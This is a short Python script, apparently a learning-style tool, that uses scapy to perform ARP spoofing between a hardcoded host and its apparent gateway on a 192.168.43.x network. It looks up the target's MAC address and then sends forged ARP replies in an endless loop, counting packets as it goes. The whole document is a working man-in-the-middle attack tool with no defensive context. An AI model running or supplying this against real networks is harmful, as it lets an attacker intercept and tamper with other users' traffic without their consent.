import scapy.all as scapy
import time
import sys
def scan(ip):

       req=scapy.ARP(pdst=ip)
       mac=scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
       reqmac=mac/req
       ans=scapy.srp(reqmac,timeout=1,verbose=False)[0]
       ret=ans[0][1].hwsrc
       return ret


def spoof(ip,sip):

	tmac=scan(ip)
	pack=scapy.ARP(op=2,pdst=ip,hwdst=tmac,psrc=sip)
	scapy.send(pack,verbose=False)

c=0
while True:
	try:
		spoof('192.168.43.242','192.168.43.1')
		spoof('192.168.43.1','192.168.43.242')
		c=c+2
		print("\r[+] Packets Sent: "+str(c)),
		sys.stdout.flush()
		time.sleep(2)
	except KeyboardInterrupt:
		print("[-]Program stopped by the user")
		sys.exit(0)
